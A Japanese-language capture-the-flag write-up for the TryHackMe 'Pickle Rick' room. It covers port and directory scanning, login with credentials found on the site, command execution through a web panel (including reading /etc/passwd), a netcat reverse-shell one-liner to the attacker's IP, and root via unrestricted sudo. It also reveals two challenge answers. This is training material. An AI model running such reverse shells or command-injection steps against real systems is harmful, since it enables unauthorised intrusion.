# Pickle Rick CTF

https://tryhackme.com/r/room/picklerick

```text
Help Morty!

Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!
```

```text
What is the first ingredient that Rick needs?
Answer format: **. **\***** \*\*\*\*

What is the second ingredient in Rick’s potion?
Answer format: \* **\*** \*\*\*\*

What is the last and final ingredient?
Answer format: **\*** **\***
```

## 偵察

### ポートスキャン

```shell
┌──(kali㉿kali)-[~]
└─$ TARGET=10.10.135.8
sudo nmap -sS $TARGET
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 00:58 EST
Nmap scan report for 10.10.135.8
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.70 seconds

┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 00:58 EST
Nmap scan report for 10.10.135.8
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.52 seconds
```

### gobuster

```shell
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.135.8
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/assets               (Status: 301) [Size: 311] [--> http://10.10.135.8/assets/]
/index.html           (Status: 200) [Size: 1062]
/server-status        (Status: 403) [Size: 276]
/robots.txt           (Status: 200) [Size: 17]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

### robots.txt

```text
Wubbalubbadubdub
```

index.html のソースコードにユーザー名は「R1ckRul3s」と書かれていて、  
/login.php に、R1ckRul3s / Wubbalubbadubdub 　でログインできた。

コマンド入力できる画面が表示される。cat は使えない。

```text
ls -al

total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

```shell
grep . Sup3rS3cretPickl3Ingred.txt
mr. mee

grep . clue.txt
Look around the file syste
```

```shell
grep . /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
landscape:x:103:105::/var/lib/landscape:/usr/sbin/nologin
tss:x:112:119:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:113:120::/nonexistent:/usr/sbin/nologin
fwupd-refresh:x:114:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

```shell
ls -al /home
total 16
drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
drwxr-xr-x 23 root   root   4096 Dec 23 05:55 ..
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  5 ubuntu ubuntu 4096 Jul 11 10:37 ubuntu

ls -al /home/rick
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients

ls -al /home/ubuntu
total 44
drwxr-xr-x 5 ubuntu ubuntu 4096 Jul 11 10:37 .
drwxr-xr-x 4 root   root   4096 Feb 10  2019 ..
-rw------- 1 ubuntu ubuntu  769 Jul 11 11:18 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31  2015 .bashrc
drwx------ 3 ubuntu ubuntu 4096 Jul 11 10:39 .cache
drwx------ 3 ubuntu ubuntu 4096 Jul 11 10:37 .gnupg
-rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Feb 10  2019 .sudo_as_admin_successful
-rw------- 1 ubuntu ubuntu 4267 Feb 10  2019 .viminfo

grep . '/home/rick/second ingredients'
1 jerry tear
```

以降はリバースシェルで

```shell
rm /tmp/f; mkfifo /tmp/f; nc 10.2.22.182 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

```shell
sudo -l
Matching Defaults entries for www-data on ip-10-10-135-8:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-135-8:
    (ALL) NOPASSWD: ALL

sudo bash
whoami
root
```

なんだって？

```shell
ls -al /root
total 36
drwx------  4 root root 4096 Jul 11 10:17 .
drwxr-xr-x 23 root root 4096 Dec 23 05:55 ..
-rw-------  1 root root  168 Jul 11 11:18 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-------  1 root root  702 Jul 11 10:17 .viminfo
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  4 root root 4096 Jul 11 10:53 snap

cat /root/3rd.txt
3rd ingredients: 
```

クリア。

## 振り返り

- www-data に無制限 sudo が付いているというガバガバすぎる設定に面喰う。Web Fundamentals の卒業チャレンジに相当するルームだから権限昇格は本題じゃないということだろう。
